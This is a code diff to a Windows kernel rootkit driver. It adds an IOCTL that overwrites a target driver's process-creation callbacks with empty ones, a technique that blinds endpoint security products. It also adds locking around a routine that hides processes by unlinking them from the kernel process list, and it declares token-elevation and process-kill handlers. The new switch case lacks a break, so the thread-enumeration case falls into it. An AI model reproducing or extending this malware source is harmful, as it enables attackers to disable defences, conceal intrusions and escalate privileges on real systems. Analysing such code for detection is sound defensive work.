@@ -11,6 +11,7 @@
 #include "AddressUtils.hpp"
 #include "Vector.hpp"
 #include "CallbackUtils.hpp"
+#include "AutoLock.hpp"
 
 // --------------------------------------------------------------------------------------------------------
 // IOCTLs 
@@ -34,6 +35,7 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 
 #define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_ERASE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 typedef struct _CALLBACK_DATA {
     UINT64 driverBase;
@@ -52,6 +54,7 @@ NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlHideProcess(HANDLE pid);
 NTSTATUS BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
+NTSTATUS BeIoctlEraseCallbacks(PWCHAR targetDriver, ULONG dwSize);
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -130,9 +133,16 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
             break;
 
         case BE_IOCTL_ENUMERATE_THREAD_CALLBACKS:
-        {
-            status = BeIoctlEnumerateCallbacks(CreateThreadNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
-        }
+            {
+                status = BeIoctlEnumerateCallbacks(CreateThreadNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
+            }
+
+        case BE_IOCTL_ERASE_CALLBACKS:
+            { 
+                PWCHAR targetDriver = (PWCHAR)buffer;
+                ULONG stringSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
+                status = BeIoctlEraseCallbacks(targetDriver, stringSize);
+            }
         break;
         }
     }
@@ -386,9 +396,13 @@ BeIoctlHideProcess(HANDLE pid)
         ObDereferenceObject(targetProcess);
         return STATUS_INVALID_PARAMETER;
     }
-    PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
-    RemoveEntryList(processListEntry);
 
+    {
+        AutoLock<FastMutex> _lock(BeGlobals::processListLock);
+        PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
+        RemoveEntryList(processListEntry);
+    }
+    
     ObDereferenceObject(targetProcess);
     return STATUS_SUCCESS;
 }
@@ -447,6 +461,53 @@ BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoSt
                 NtStatus = STATUS_BUFFER_TOO_SMALL;
             }
         }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        NtStatus = GetExceptionCode();
+    }
+
+    return NtStatus;
+}
+
+/**
+ * Replaces all kernel callbacks of a specified driver with empty callbacks.
+ *
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeIoctlEraseCallbacks(PWCHAR targetDriver, ULONG dwSize)
+{
+    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
+
+    LOG_MSG("BeIoctlEraseCallbacks called, size: %i \r\n", dwSize);
+
+    __try
+    {
+        // TODO: wrap all this string checking code into a function
+        // Check alignment
+        if (dwSize % sizeof(WCHAR) != 0)
+        {
+            LOG_MSG("Invalid alignment \r\n");
+            return STATUS_INVALID_BUFFER_SIZE;
+        }
+
+        if (!targetDriver)
+        {
+            LOG_MSG("Empty buffer \r\n");
+            return STATUS_INVALID_PARAMETER;
+        }
+
+        LOG_MSG("String received: %ws \r\n", targetDriver);
+
+        if (BeIsStringTerminated(targetDriver, dwSize) == FALSE)
+        {
+            LOG_MSG("Not null terminated! \r\n");
+            return STATUS_UNSUCCESSFUL;
+        }
+
+        // TODO: also get type of callback. for now hardcoded to createprocess callbacks
+        NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, CreateProcessNotifyRoutine);
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
